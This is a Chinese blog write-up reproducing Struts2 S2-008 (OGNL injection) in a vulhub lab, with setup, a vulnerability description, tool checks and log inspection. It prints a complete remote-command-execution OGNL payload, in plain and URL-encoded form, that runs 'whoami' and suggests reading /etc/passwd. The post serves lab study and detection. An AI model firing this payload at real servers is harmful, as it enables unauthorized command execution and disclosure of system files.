# CVE-2012-0391 S2-008 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15630627.html`](https://www.cnblogs.com/peace-and-romance/p/15630627.html)

### 0X00-引言

* * *

蝴蝶死在路上，云边藏着念想。有些人刻苦铭心，没几年会遗忘。有些人不论生死，都陪在身旁。---张嘉佳《刘十三》

刘，十三。留，失散？

程霜，成双。

两代人终归失散，一个人心念成双。---张嘉佳《云边有个小卖部》

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。

**漏洞成因：**

主要利用对传入参数没有严格限制，导致多个地方可以执行恶意代码。

第一种情况其实就是 S2-007，在异常处理时的 OGNL 执行第二种的 cookie 的方式，虽然在 struts2 没有对恶意代码进行限制，但是 java 的 webserver（Tomcat），对 cookie 的名称有较多限制，在传入 struts2 之前就被处理，从而较为鸡肋第三种需要开启 devModedebug 模式。

例如在 devMode 模式下直接添加参数 `?debug=command&expression=` 会直接执行后面的 OGNL 表达式.

影响版本：Struts 2.1.0 - Struts 2.3.1

### 0X03-漏洞复现

* * *

##### 01-任意命令执行

如果页面不刷新，清除历史记录，whoami 为变量，可更改，例：cat /etc/passwd

payload:

```
#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close() 
```

url 编码：

```
%23%63%6f%6e%74%65%78%74%5b%22%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%22%5d%3d%66%61%6c%73%65%2c%23%66%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%29%2c%23%66%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%66%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%77%68%6f%61%6d%69%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%67%65%6e%78%6f%72%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%67%65%6e%78%6f%72%2e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%67%65%6e%78%6f%72%2e%66%6c%75%73%68%28%29%2c%23%67%65%6e%78%6f%72%2e%63%6c%6f%73%65%28%29 
```

![image-20211201145238949](img/d8bd6ca01fd5f171b7a7497a1006c896.png)

### 0X04-工具检测

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

![image-20211201151033101](img/0417a83d22ac569d5017fc99a10a7cb0.png)

### 0X05-查看日志

* * *

```
docker ps #查看容器 ID
docker exec -it ID /bin/bash #进入
cd logs #进入日志目录
cat localhost_access_log.2021-12-02.txt #查看日志
exit #退出容器 
```

![image-20211201153426858](img/056be2f42ede6a4a07080b3d03b2bbf3.png)

可以看到 payload

想到一个骚操作，用工具查看日志，由于命令执行时的位置在日志文件夹的上一级

假装不知道日志文件夹中的内容

尝试命令`cd logs ; ls`查看日志文件夹内容

失败

![image-20211201153832267](img/a59b9b1df8fce4f9b82d63f88238da32.png)

莫非命令不对`cd logs && ls`

失败

![image-20211201154134073](img/70ee87b9b14eb254c168a7d7e5baf02b.png)

换个白盒姿势，从容器内找到日志文件的路径

![image-20211201154622995](img/e910e15a3217cd057334137c99d7188e.png)

`cat ./logs/localhost_access_log.2021-12-02.txt`

shell 查看可以

![image-20211201154854238](img/58b90c35321be38ea68544733cfb2794.png)

工具查看也可以：![image-20211201154940772](img/31b1fec4914ed8bb32501d359fd12165.png)

换了个工具也不可以

![image-20211201155824240](img/9a58d8bcf0060bd3c905d744e0e7b626.png)

![image-20211201160047548](img/94227653400156e4adef9222edf61ef4.png)

工具好像不支持复合命令，知道绝对路径可以查看

### 0X06-参考

* * *

[linux 如何同时执行两个命令,如何同时运行两个或者多个终端命令](https://blog.csdn.net/weixin_29009971/article/details/116896040)

[Struts2-008 命令执行（CVE-2012-0392）](https://www.cnblogs.com/Xor0ne/articles/13488922.html)

[S2-008 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md)